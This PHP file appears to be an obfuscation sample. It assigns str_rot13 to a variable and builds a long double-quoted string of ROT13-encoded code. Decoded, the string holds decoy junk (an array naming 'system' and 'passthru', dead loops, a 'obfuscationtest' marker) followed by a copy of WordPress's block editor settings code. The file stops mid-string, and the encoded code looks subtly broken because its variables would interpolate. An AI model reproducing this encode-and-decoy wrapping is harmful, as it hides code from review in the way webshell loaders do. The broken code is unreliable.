<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Rqvgbe NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Rqvgbe
 * @fvapr 5.8.0
 */

/**
 * Ergheaf gur yvfg bs qrsnhyg pngrtbevrf sbe oybpx glcrf.
 *
 * @fvapr 5.8.0
 * @fvapr 6.3.0 Erhfnoyr Oybpxf eranzrq gb Cnggreaf.
 *
 * @erghea neenl[] Neenl bs pngrtbevrf sbe oybpx glcrf.
 */
shapgvba trg_qrsnhyg_oybpx_pngrtbevrf() {
	erghea neenl(
		neenl(
			'fyht'  => 'grkg',
			'gvgyr' => _k( 'Grkg', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
		neenl(
			'fyht'  => 'zrqvn',
			'gvgyr' => _k( 'Zrqvn', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
		neenl(
			'fyht'  => 'qrfvta',
			'gvgyr' => _k( 'Qrfvta', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
		neenl(
			'fyht'  => 'jvqtrgf',
			'gvgyr' => _k( 'Jvqtrgf', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
		neenl(
			'fyht'  => 'gurzr',
			'gvgyr' => _k( 'Gurzr', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
		neenl(
			'fyht'  => 'rzorq',
			'gvgyr' => _k( 'Rzorqf', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
		neenl(
			'fyht'  => 'erhfnoyr',
			'gvgyr' => _k( 'Cnggreaf', 'oybpx pngrtbel' ),
			'vpba'  => ahyy,
		),
	);
}

/**
 * Ergheaf nyy gur pngrtbevrf sbe oybpx glcrf gung jvyy or fubja va gur oybpx rqvgbe.
 *
 * @fvapr 5.0.0
 * @fvapr 5.8.0 Vg vf cbffvoyr gb cnff gur oybpx rqvgbe pbagrkg nf cnenz.
 *
 * @cnenz JC_Cbfg|JC_Oybpx_Rqvgbe_Pbagrkg $cbfg_be_oybpx_rqvgbe_pbagrkg Gur pheerag cbfg bowrpg be
 *                                                                      gur oybpx rqvgbe pbagrkg.
 *
 * @erghea neenl[] Neenl bs pngrtbevrf sbe oybpx glcrf.
 */
shapgvba trg_oybpx_pngrtbevrf( $cbfg_be_oybpx_rqvgbe_pbagrkg ) {
	$oybpx_pngrtbevrf     = trg_qrsnhyg_oybpx_pngrtbevrf();
	$oybpx_rqvgbe_pbagrkg = $cbfg_be_oybpx_rqvgbe_pbagrkg vafgnaprbs JC_Cbfg ?
		arj JC_Oybpx_Rqvgbe_Pbagrkg(
			neenl(
				'cbfg' => $cbfg_be_oybpx_rqvgbe_pbagrkg,
			)
		) : $cbfg_be_oybpx_rqvgbe_pbagrkg;

	/**
	 * Svygref gur qrsnhyg neenl bs pngrtbevrf sbe oybpx glcrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl[]                 $oybpx_pngrtbevrf     Neenl bs pngrtbevrf sbe oybpx glcrf.
	 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
	 */
	$oybpx_pngrtbevrf = nccyl_svygref( 'oybpx_pngrtbevrf_nyy', $oybpx_pngrtbevrf, $oybpx_rqvgbe_pbagrkg );

	vs ( ! rzcgl( $oybpx_rqvgbe_pbagrkg->cbfg ) ) {
		$cbfg = $oybpx_rqvgbe_pbagrkg->cbfg;

		/**
		 * Svygref gur qrsnhyg neenl bs pngrtbevrf sbe oybpx glcrf.
		 *
		 * @fvapr 5.0.0
		 * @qrcerpngrq 5.8.0 Hfr gur {@frr 'oybpx_pngrtbevrf_nyy'} svygre vafgrnq.
		 *
		 * @cnenz neenl[] $oybpx_pngrtbevrf Neenl bs pngrtbevrf sbe oybpx glcrf.
		 * @cnenz JC_Cbfg $cbfg             Cbfg orvat ybnqrq.
		 */
		$oybpx_pngrtbevrf = nccyl_svygref_qrcerpngrq( 'oybpx_pngrtbevrf', neenl( $oybpx_pngrtbevrf, $cbfg ), '5.8.0', 'oybpx_pngrtbevrf_nyy' );
	}

	erghea $oybpx_pngrtbevrf;
}

/**
 * Trgf gur yvfg bs nyybjrq oybpx glcrf gb hfr va gur oybpx rqvgbe.
 *
 * @fvapr 5.8.0
 *
 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
 *
 * @erghea obby|fgevat[] Neenl bs oybpx glcr fyhtf, be obbyrna gb ranoyr/qvfnoyr nyy.
 */
shapgvba trg_nyybjrq_oybpx_glcrf( $oybpx_rqvgbe_pbagrkg ) {
	$nyybjrq_oybpx_glcrf = gehr;

	/**
	 * Svygref gur nyybjrq oybpx glcrf sbe nyy rqvgbe glcrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz obby|fgevat[]           $nyybjrq_oybpx_glcrf  Neenl bs oybpx glcr fyhtf, be obbyrna gb ranoyr/qvfnoyr nyy.
	 *                                                      Qrsnhyg gehr (nyy ertvfgrerq oybpx glcrf fhccbegrq).
	 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
	 */
	$nyybjrq_oybpx_glcrf = nccyl_svygref( 'nyybjrq_oybpx_glcrf_nyy', $nyybjrq_oybpx_glcrf, $oybpx_rqvgbe_pbagrkg );

	vs ( ! rzcgl( $oybpx_rqvgbe_pbagrkg->cbfg ) ) {
		$cbfg = $oybpx_rqvgbe_pbagrkg->cbfg;

		/**
		 * Svygref gur nyybjrq oybpx glcrf sbe gur rqvgbe.
		 *
		 * @fvapr 5.0.0
		 * @qrcerpngrq 5.8.0 Hfr gur {@frr 'nyybjrq_oybpx_glcrf_nyy'} svygre vafgrnq.
		 *
		 * @cnenz obby|fgevat[] $nyybjrq_oybpx_glcrf Neenl bs oybpx glcr fyhtf, be obbyrna gb ranoyr/qvfnoyr nyy.
		 *                                           Qrsnhyg gehr (nyy ertvfgrerq oybpx glcrf fhccbegrq)
		 * @cnenz JC_Cbfg       $cbfg                Gur cbfg erfbhepr qngn.
		 */
		$nyybjrq_oybpx_glcrf = nccyl_svygref_qrcerpngrq( 'nyybjrq_oybpx_glcrf', neenl( $nyybjrq_oybpx_glcrf, $cbfg ), '5.8.0', 'nyybjrq_oybpx_glcrf_nyy' );
	}

	erghea $nyybjrq_oybpx_glcrf;
}

/**
 * Ergheaf gur qrsnhyg oybpx rqvgbe frggvatf.
 *
 * @fvapr 5.8.0
 *
 * @erghea neenl Gur qrsnhyg oybpx rqvgbe frggvatf.
 */
shapgvba trg_qrsnhyg_oybpx_rqvgbe_frggvatf() {
	// Zrqvn frggvatf.

	// jc_znk_hcybnq_fvmr() pna or rkcrafvir, fb bayl pnyy vg jura eryrinag sbe gur pheerag hfre.
	$znk_hcybnq_fvmr = 0;
	vs ( pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		$znk_hcybnq_fvmr = jc_znk_hcybnq_fvmr();
		vs ( ! $znk_hcybnq_fvmr ) {
			$znk_hcybnq_fvmr = 0;
		}
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
	$vzntr_fvmr_anzrf = nccyl_svygref(
		'vzntr_fvmr_anzrf_pubbfr',
		neenl(
			'guhzoanvy' => __( 'Guhzoanvy' ),
			'zrqvhz'    => __( 'Zrqvhz' ),
			'ynetr'     => __( 'Ynetr' ),
			'shyy'      => __( 'Shyy Fvmr' ),
		)
	);

	$ninvynoyr_vzntr_fvmrf = neenl();
	sbernpu ( $vzntr_fvmr_anzrf nf $vzntr_fvmr_fyht => $vzntr_fvmr_anzr ) {
		$ninvynoyr_vzntr_fvmrf[] = neenl(
			'fyht' => $vzntr_fvmr_fyht,
			'anzr' => $vzntr_fvmr_anzr,
		);
	}

	$qrsnhyg_fvmr       = trg_bcgvba( 'vzntr_qrsnhyg_fvmr', 'ynetr' );
	$vzntr_qrsnhyg_fvmr = va_neenl( $qrsnhyg_fvmr, neenl_xrlf( $vzntr_fvmr_anzrf ), gehr ) ? $qrsnhyg_fvmr : 'ynetr';

	$vzntr_qvzrafvbaf = neenl();
	$nyy_fvmrf        = jc_trg_ertvfgrerq_vzntr_fhofvmrf();
	sbernpu ( $ninvynoyr_vzntr_fvmrf nf $fvmr ) {
		$xrl = $fvmr['fyht'];
		vs ( vffrg( $nyy_fvmrf[ $xrl ] ) ) {
			$vzntr_qvzrafvbaf[ $xrl ] = $nyy_fvmrf[ $xrl ];
		}
	}

	// Gurfr fglyrf ner hfrq vs gur \"ab gurzr fglyrf\" bcgvbaf vf gevttrerq be ba
	// gurzrf jvgubhg gurve bja rqvgbe fglyrf.
	$qrsnhyg_rqvgbe_fglyrf_svyr = NOFCNGU . JCVAP . '/pff/qvfg/oybpx-rqvgbe/qrsnhyg-rqvgbe-fglyrf.pff';

	fgngvp $qrsnhyg_rqvgbe_fglyrf_svyr_pbagragf = snyfr;
	vs ( ! $qrsnhyg_rqvgbe_fglyrf_svyr_pbagragf && svyr_rkvfgf( $qrsnhyg_rqvgbe_fglyrf_svyr ) ) {
		$qrsnhyg_rqvgbe_fglyrf_svyr_pbagragf = svyr_trg_pbagragf( $qrsnhyg_rqvgbe_fglyrf_svyr );
	}

	$qrsnhyg_rqvgbe_fglyrf = neenl();
	vs ( $qrsnhyg_rqvgbe_fglyrf_svyr_pbagragf ) {
		$qrsnhyg_rqvgbe_fglyrf = neenl(
			neenl( 'pff' => $qrsnhyg_rqvgbe_fglyrf_svyr_pbagragf ),
		);
	}

	$rqvgbe_frggvatf = neenl(
		'nyvtaJvqr'                        => trg_gurzr_fhccbeg( 'nyvta-jvqr' ),
		'nyybjrqOybpxGlcrf'                => gehr,
		'nyybjrqZvzrGlcrf'                 => trg_nyybjrq_zvzr_glcrf(),
		'qrsnhygRqvgbeFglyrf'              => $qrsnhyg_rqvgbe_fglyrf,
		'oybpxPngrtbevrf'                  => trg_qrsnhyg_oybpx_pngrtbevrf(),
		'vfEGY'                            => vf_egy(),
		'vzntrQrsnhygFvmr'                 => $vzntr_qrsnhyg_fvmr,
		'vzntrQvzrafvbaf'                  => $vzntr_qvzrafvbaf,
		'vzntrRqvgvat'                     => gehr,
		'vzntrFvmrf'                       => $ninvynoyr_vzntr_fvmrf,
		'znkHcybnqSvyrFvmr'                => $znk_hcybnq_fvmr,
		'__rkcrevzragnyQnfuobneqYvax'      => nqzva_hey( '/' ),
		// Gur sbyybjvat synt vf erdhverq gb ranoyr gur arj Tnyyrel oybpx sbezng ba gur zbovyr nccf va 5.9.
		'__hafgnoyrTnyyrelJvguVzntrOybpxf' => gehr,
	);

	$gurzr_frggvatf = trg_pynffvp_gurzr_fhccbegf_oybpx_rqvgbe_frggvatf();
	sbernpu ( $gurzr_frggvatf nf $xrl => $inyhr ) {
		$rqvgbe_frggvatf[ $xrl ] = $inyhr;
	}

	erghea $rqvgbe_frggvatf;
}

/**
 * Ergheaf gur oybpx rqvgbe frggvatf arrqrq gb hfr gur Yrtnpl Jvqtrg oybpx juvpu
 * vf abg ertvfgrerq ol qrsnhyg.
 *
 * @fvapr 5.8.0
 *
 * @erghea neenl Frggvatf gb or hfrq jvgu trg_oybpx_rqvgbe_frggvatf().
 */
shapgvba trg_yrtnpl_jvqtrg_oybpx_rqvgbe_frggvatf() {
	$rqvgbe_frggvatf = neenl();

	/**
	 * Svygref gur yvfg bs jvqtrg-glcr VQf gung fubhyq **abg** or bssrerq ol gur
	 * Yrtnpl Jvqtrg oybpx.
	 *
	 * Ergheavat na rzcgl neenl jvyy znxr nyy jvqtrgf ninvynoyr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat[] $jvqtrgf Na neenl bs rkpyhqrq jvqtrg-glcr VQf.
	 */
	$rqvgbe_frggvatf['jvqtrgGlcrfGbUvqrSebzYrtnplJvqtrgOybpx'] = nccyl_svygref(
		'jvqtrg_glcrf_gb_uvqr_sebz_yrtnpl_jvqtrg_oybpx',
		neenl(
			'cntrf',
			'pnyraqne',
			'nepuvirf',
			'zrqvn_nhqvb',
			'zrqvn_vzntr',
			'zrqvn_tnyyrel',
			'zrqvn_ivqrb',
			'frnepu',
			'grkg',
			'pngrtbevrf',
			'erprag-cbfgf',
			'erprag-pbzzragf',
			'eff',
			'gnt_pybhq',
			'phfgbz_ugzy',
			'oybpx',
		)
	);

	erghea $rqvgbe_frggvatf;
}

/**
 * Pbyyrpg gur oybpx rqvgbe nffrgf gung arrq gb or ybnqrq vagb gur rqvgbe'f vsenzr.
 *
 * @fvapr 6.0.0
 * @npprff cevingr
 *
 * @tybony JC_Fglyrf  $jc_fglyrf  Gur JC_Fglyrf pheerag vafgnapr.
 * @tybony JC_Fpevcgf $jc_fpevcgf Gur JC_Fpevcgf pheerag vafgnapr.
 *
 * @erghea neenl {
 *     Gur oybpx rqvgbe nffrgf.
 *
 *     @glcr fgevat|snyfr $fglyrf  Fgevat pbagnvavat gur UGZY sbe fglyrf.
 *     @glcr fgevat|snyfr $fpevcgf Fgevat pbagnvavat gur UGZY sbe fpevcgf.
 * }
 */
shapgvba _jc_trg_vsenzrq_rqvgbe_nffrgf() {
	tybony $jc_fglyrf, $jc_fpevcgf;

	// Xrrc genpx bs gur fglyrf naq fpevcgf vafgnapr gb erfgber yngre.
	$pheerag_jc_fglyrf  = $jc_fglyrf;
	$pheerag_jc_fpevcgf = $jc_fpevcgf;

	// Perngr arj vafgnaprf gb pbyyrpg gur nffrgf.
	$jc_fglyrf  = arj JC_Fglyrf();
	$jc_fpevcgf = arj JC_Fpevcgf();

	/*
	 * Ertvfgre nyy pheeragyl ertvfgrerq fglyrf naq fpevcgf. Gur npgvbaf gung
	 * sbyybj radhrhr nffrgf, ohg qba'g arprffnevyl ertvfgre gurz.
	 */
	$jc_fglyrf->ertvfgrerq  = $pheerag_jc_fglyrf->ertvfgrerq;
	$jc_fpevcgf->ertvfgrerq = $pheerag_jc_fpevcgf->ertvfgrerq;

	/*
	 * Jr trarenyyl qb abg arrq erfrg fglyrf sbe gur vsenzrq rqvgbe.
	 * Ubjrire, vs vg'f n pynffvp gurzr, znetvaf jvyy or nqqrq gb rirel oybpx,
	 * juvpu vf erfrg fcrpvsvpnyyl sbe yvfg vgrzf, fb pynffvp gurzrf eryl ba
	 * gurfr erfrg fglyrf.
	 */
	$jc_fglyrf->qbar =
		jc_gurzr_unf_gurzr_wfba() ? neenl( 'jc-erfrg-rqvgbe-fglyrf' ) : neenl();

	jc_radhrhr_fpevcg( 'jc-cbylsvyy' );
	// Radhrhr gur `rqvgbeFglyr` unaqyrf sbe nyy pber oybpx, naq qrcraqrapvrf.
	jc_radhrhr_fglyr( 'jc-rqvg-oybpxf' );

	vs ( pheerag_gurzr_fhccbegf( 'jc-oybpx-fglyrf' ) ) {
		jc_radhrhr_fglyr( 'jc-oybpx-yvoenel-gurzr' );
	}

	/*
	 * Jr qba'g jnag gb ybnq RQVGBE fpevcgf va gur vsenzr, bayl radhrhr
	 * sebag-raq nffrgf sbe gur pbagrag.
	 */
	nqq_svygre( 'fubhyq_ybnq_oybpx_rqvgbe_fpevcgf_naq_fglyrf', '__erghea_snyfr' );
	qb_npgvba( 'radhrhr_oybpx_nffrgf' );
	erzbir_svygre( 'fubhyq_ybnq_oybpx_rqvgbe_fpevcgf_naq_fglyrf', '__erghea_snyfr' );

	$oybpx_ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

	/*
	 * Nqqvgvbanyyl, qb radhrhr `rqvgbeFglyr` nffrgf sbe nyy oybpxf, juvpu
	 * pbagnvaf rqvgbe-bayl fglyvat sbe oybpxf (rqvgbe pbagrag).
	 */
	sbernpu ( $oybpx_ertvfgel->trg_nyy_ertvfgrerq() nf $oybpx_glcr ) {
		vs ( vffrg( $oybpx_glcr->rqvgbe_fglyr_unaqyrf ) && vf_neenl( $oybpx_glcr->rqvgbe_fglyr_unaqyrf ) ) {
			sbernpu ( $oybpx_glcr->rqvgbe_fglyr_unaqyrf nf $fglyr_unaqyr ) {
				jc_radhrhr_fglyr( $fglyr_unaqyr );
			}
		}
	}

	/**
	 * Erzbir gur qrcerpngrq `cevag_rzbwv_fglyrf` unaqyre.
	 * Vg nibvqf oernxvat fglyr trarengvba jvgu n qrcerpngvba zrffntr.
	 */
	$unf_rzbwv_fglyrf = unf_npgvba( 'jc_cevag_fglyrf', 'cevag_rzbwv_fglyrf' );
	vs ( $unf_rzbwv_fglyrf ) {
		erzbir_npgvba( 'jc_cevag_fglyrf', 'cevag_rzbwv_fglyrf' );
	}

	bo_fgneg();
	jc_cevag_fglyrf();
	jc_cevag_sbag_snprf();
	jc_cevag_sbag_snprf_sebz_fglyr_inevngvbaf();
	$fglyrf = bo_trg_pyrna();

	vs ( $unf_rzbwv_fglyrf ) {
		nqq_npgvba( 'jc_cevag_fglyrf', 'cevag_rzbwv_fglyrf' );
	}

	bo_fgneg();
	jc_cevag_urnq_fpevcgf();
	jc_cevag_sbbgre_fpevcgf();
	$fpevcgf = bo_trg_pyrna();

	// Erfgber gur bevtvany vafgnaprf.
	$jc_fglyrf  = $pheerag_jc_fglyrf;
	$jc_fpevcgf = $pheerag_jc_fpevcgf;

	erghea neenl(
		'fglyrf'  => $fglyrf,
		'fpevcgf' => $fpevcgf,
	);
}

/**
 * Svaqf gur svefg bppheerapr bs n fcrpvsvp oybpx va na neenl bs oybpxf.
 *
 * @fvapr 6.3.0
 *
 * @cnenz neenl  $oybpxf     Neenl bs oybpxf.
 * @cnenz fgevat $oybpx_anzr Anzr bs gur oybpx gb svaq.
 * @erghea neenl Sbhaq oybpx, be rzcgl neenl vs abar sbhaq.
 */
shapgvba jc_trg_svefg_oybpx( $oybpxf, $oybpx_anzr ) {
	sbernpu ( $oybpxf nf $oybpx ) {
		vs ( $oybpx_anzr === $oybpx['oybpxAnzr'] ) {
			erghea $oybpx;
		}
		vs ( ! rzcgl( $oybpx['vaareOybpxf'] ) ) {
			$sbhaq_oybpx = jc_trg_svefg_oybpx( $oybpx['vaareOybpxf'], $oybpx_anzr );

			vs ( ! rzcgl( $sbhaq_oybpx ) ) {
				erghea $sbhaq_oybpx;
			}
		}
	}

	erghea neenl();
}

/**
 * Ergevrirf Cbfg Pbagrag oybpx nggevohgrf sebz gur pheerag cbfg grzcyngr.
 *
 * @fvapr 6.3.0
 * @fvapr 6.4.0 Erghea ahyy vs gurer vf ab cbfg pbagrag oybpx.
 * @npprff cevingr
 *
 * @tybony vag $cbfg_VQ
 *
 * @erghea neenl|ahyy Cbfg Pbagrag oybpx nggevohgrf neenl be ahyy vs Cbfg Pbagrag oybpx qbrfa'g rkvfg.
 */
shapgvba jc_trg_cbfg_pbagrag_oybpx_nggevohgrf() {
	tybony $cbfg_VQ;

	$vf_oybpx_gurzr = jc_vf_oybpx_gurzr();

	vs ( ! $vf_oybpx_gurzr || ! $cbfg_VQ ) {
		erghea ahyy;
	}

	$grzcyngr_fyht = trg_cntr_grzcyngr_fyht( $cbfg_VQ );

	vs ( ! $grzcyngr_fyht ) {
		$cbfg_fyht      = 'fvathyne';
		$cntr_fyht      = 'fvathyne';
		$grzcyngr_glcrf = trg_oybpx_grzcyngrf();

		sbernpu ( $grzcyngr_glcrf nf $grzcyngr_glcr ) {
			vs ( 'cntr' === $grzcyngr_glcr->fyht ) {
				$cntr_fyht = 'cntr';
			}
			vs ( 'fvatyr' === $grzcyngr_glcr->fyht ) {
				$cbfg_fyht = 'fvatyr';
			}
		}

		$jung_cbfg_glcr = trg_cbfg_glcr( $cbfg_VQ );
		fjvgpu ( $jung_cbfg_glcr ) {
			pnfr 'cntr':
				$grzcyngr_fyht = $cntr_fyht;
				oernx;
			qrsnhyg:
				$grzcyngr_fyht = $cbfg_fyht;
				oernx;
		}
	}

	$pheerag_grzcyngr = trg_oybpx_grzcyngrf( neenl( 'fyht__va' => neenl( $grzcyngr_fyht ) ) );

	vs ( ! rzcgl( $pheerag_grzcyngr ) ) {
		$grzcyngr_oybpxf    = cnefr_oybpxf( $pheerag_grzcyngr[0]->pbagrag );
		$cbfg_pbagrag_oybpx = jc_trg_svefg_oybpx( $grzcyngr_oybpxf, 'pber/cbfg-pbagrag' );

		vs ( vffrg( $cbfg_pbagrag_oybpx['nggef'] ) ) {
			erghea $cbfg_pbagrag_oybpx['nggef'];
		}
	}

	erghea ahyy;
}

/**
 * Ergheaf gur pbagrkghnyvmrq oybpx rqvgbe frggvatf sbe n fryrpgrq rqvgbe pbagrkg.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl                   $phfgbz_frggvatf      Phfgbz frggvatf gb hfr jvgu gur tvira rqvgbe glcr.
 * @cnenz JC_Oybpx_Rqvgbe_Pbagrkg $oybpx_rqvgbe_pbagrkg Gur pheerag oybpx rqvgbe pbagrkg.
 *
 * @erghea neenl Gur pbagrkghnyvmrq oybpx rqvgbe frggvatf.
 */
shapgvba trg_oybpx_rqvgbe_frggvatf( neenl $phfgbz_frggvatf, $oybpx_rqvgbe_pbagrkg ) {
	$rqvgbe_frggvatf = neenl_zretr(
		trg_qrsnhyg_oybpx_rqvgbe_frggvatf(),
		neenl(
			'nyybjrqOybpxGlcrf' => trg_nyybjrq_oybpx_glcrf( $oybpx_rqvgbe_pbagrkg ),
			'oybpxPngrtbevrf'   => trg_oybpx_pngrtbevrf( $oybpx_rqvgbe_pbagrkg ),
		),
		$phfgbz_frggvatf
	);

	$tybony_fglyrf = neenl();
	$cerfrgf       = neenl(
		neenl(
			'pff'            => 'inevnoyrf',
			'__hafgnoyrGlcr' => 'cerfrgf',
			'vfTybonyFglyrf' => gehr,
		),
		neenl(
			'pff'            => 'cerfrgf',
			'__hafgnoyrGlcr' => 'cerfrgf',
			'vfTybonyFglyrf' => gehr,
		),
	);
	sbernpu ( $cerfrgf nf $cerfrg_fglyr ) {
		$npghny_pff = jc_trg_tybony_fglyrfurrg( neenl( $cerfrg_fglyr['pff'] ) );
		vs ( '' !== $npghny_pff ) {
			$cerfrg_fglyr['pff'] = $npghny_pff;
			$tybony_fglyrf[]     = $cerfrg_fglyr;
		}
	}

	vs ( jc_gurzr_unf_gurzr_wfba() ) {
		$oybpx_pynffrf = neenl(
			'pff'            => 'fglyrf',
			'__hafgnoyrGlcr' => 'gurzr',
			'vfTybonyFglyrf' => gehr,
		);
		$npghny_pff    = jc_trg_tybony_fglyrfurrg( neenl( $oybpx_pynffrf['pff'] ) );
		vs ( '' !== $npghny_pff ) {
			$oybpx_pynffrf['pff'] = $npghny_pff;
			$tybony_fglyrf[]      = $oybpx_pynffrf;
		}

		/*
		 * Nqq gur phfgbz PFF nf n frcnengr fglyrfurrg fb nal vainyvq PFF
		 * ragrerq ol hfref qbrf abg oernx bgure tybony fglyrf.
		 */
		$tybony_fglyrf[] = neenl(
			'pff'            => jc_trg_tybony_fglyrfurrg( neenl( 'phfgbz-pff' ) ),
			'__hafgnoyrGlcr' => 'hfre',
			'vfTybonyFglyrf' => gehr,
		);
	} ryfr {
		// Vs gurer vf ab `gurzr.wfba` svyr, rafher onfr ynlbhg fglyrf ner fgvyy ninvynoyr.
		$oybpx_pynffrf = neenl(
			'pff'            => 'onfr-ynlbhg-fglyrf',
			'__hafgnoyrGlcr' => 'onfr-ynlbhg',
			'vfTybonyFglyrf' => gehr,
		);
		$npghny_pff    = jc_trg_tybony_fglyrfurrg( neenl( $oybpx_pynffrf['pff'] ) );
		vs ( '' !== $npghny_pff ) {
			$oybpx_pynffrf['pff'] = $npghny_pff;
			$tybony_fglyrf[]      = $oybpx_pynffrf;
		}
	}

	$rqvgbe_frggvatf['fglyrf'] = neenl_zretr( $tybony_fglyrf, trg_oybpx_rqvgbe_gurzr_fglyrf() );

	$rqvgbe_frggvatf['__rkcrevzragnySrngherf'] = jc_trg_tybony_frggvatf();
	// Gurfr frggvatf znl arrq gb or hcqngrq onfrq ba qngn pbzvat sebz gurzr.wfba fbheprf.
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['cnyrggr'] ) ) {
		$pbybef_ol_bevtva          = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['cnyrggr'];
		$rqvgbe_frggvatf['pbybef'] = vffrg( $pbybef_ol_bevtva['phfgbz'] ) ?
			$pbybef_ol_bevtva['phfgbz'] : (
				vffrg( $pbybef_ol_bevtva['gurzr'] ) ?
					$pbybef_ol_bevtva['gurzr'] :
					$pbybef_ol_bevtva['qrsnhyg']
			);
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['tenqvragf'] ) ) {
		$tenqvragf_ol_bevtva          = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['tenqvragf'];
		$rqvgbe_frggvatf['tenqvragf'] = vffrg( $tenqvragf_ol_bevtva['phfgbz'] ) ?
			$tenqvragf_ol_bevtva['phfgbz'] : (
				vffrg( $tenqvragf_ol_bevtva['gurzr'] ) ?
					$tenqvragf_ol_bevtva['gurzr'] :
					$tenqvragf_ol_bevtva['qrsnhyg']
			);
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['sbagFvmrf'] ) ) {
		$sbag_fvmrf_ol_bevtva         = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['sbagFvmrf'];
		$rqvgbe_frggvatf['sbagFvmrf'] = vffrg( $sbag_fvmrf_ol_bevtva['phfgbz'] ) ?
			$sbag_fvmrf_ol_bevtva['phfgbz'] : (
				vffrg( $sbag_fvmrf_ol_bevtva['gurzr'] ) ?
					$sbag_fvmrf_ol_bevtva['gurzr'] :
					$sbag_fvmrf_ol_bevtva['qrsnhyg']
			);
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['phfgbz'] ) ) {
		$rqvgbe_frggvatf['qvfnoyrPhfgbzPbybef'] = ! $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['phfgbz'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['phfgbz'] );
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['phfgbzTenqvrag'] ) ) {
		$rqvgbe_frggvatf['qvfnoyrPhfgbzTenqvragf'] = ! $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['phfgbzTenqvrag'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['pbybe']['phfgbzTenqvrag'] );
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['phfgbzSbagFvmr'] ) ) {
		$rqvgbe_frggvatf['qvfnoyrPhfgbzSbagFvmrf'] = ! $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['phfgbzSbagFvmr'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['phfgbzSbagFvmr'] );
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['yvarUrvtug'] ) ) {
		$rqvgbe_frggvatf['ranoyrPhfgbzYvarUrvtug'] = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['yvarUrvtug'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['glcbtencul']['yvarUrvtug'] );
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['havgf'] ) ) {
		$rqvgbe_frggvatf['ranoyrPhfgbzHavgf'] = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['havgf'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['havgf'] );
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['cnqqvat'] ) ) {
		$rqvgbe_frggvatf['ranoyrPhfgbzFcnpvat'] = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['cnqqvat'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['cnqqvat'] );
	}
	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['phfgbzFcnpvatFvmr'] ) ) {
		$rqvgbe_frggvatf['qvfnoyrPhfgbzFcnpvatFvmrf'] = ! $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['phfgbzFcnpvatFvmr'];
		hafrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['phfgbzFcnpvatFvmr'] );
	}

	vs ( vffrg( $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['fcnpvatFvmrf'] ) ) {
		$fcnpvat_fvmrf_ol_bevtva         = $rqvgbe_frggvatf['__rkcrevzragnySrngherf']['fcnpvat']['fcnpvatFvmrf'];
		$rqvgbe_frggvatf['fcnpvatFvmrf'] = vffrg( $fcnpvat_fvmrf_ol_bevtva['phfgbz'] ) ?
